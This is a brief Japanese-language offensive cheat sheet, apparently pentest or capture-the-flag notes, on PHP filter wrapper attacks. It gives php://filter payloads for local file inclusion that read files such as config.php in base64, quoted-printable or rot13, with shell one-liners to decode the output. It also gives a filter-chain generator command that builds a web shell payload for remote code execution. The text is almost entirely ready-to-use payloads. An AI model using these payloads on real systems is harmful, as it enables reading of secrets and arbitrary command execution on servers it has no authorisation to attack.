# PHP Filter Wrapper


## ファイル読み込み (LFI)

Base64エンコード読み込み


    php://filter/convert.base64-encode/resource=config.php

       

## Base64が使えない環境や、特定の文字を回避したい場合

    php://filter/convert.quoted-printable-encode/resource=index.php

    php://filter/string.rot13/resource=index.php

    

### Quoted-Printable をデコードする (Pythonを使用)

```
echo "=3C?php..." | python3 -c "import quopri, sys; print(quopri.decodestring(sys.stdin.read().encode()).decode())"
```

### ROT13 を元に戻す

```
echo "<?cuc..." | tr 'A-Za-z' 'N-ZA-Mn-za-m'
```


# PHP Filter Chain (RCE)

大量の `convert.iconv` フィルターを繋いでメモリ上にペイロードを構築する。

### 使用ツール

```
python3 php_filter_chain_generator.py --data '<?php system($_GET["cmd"]); ?>'
```

```
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|...（中略）.../resource=index.php
```
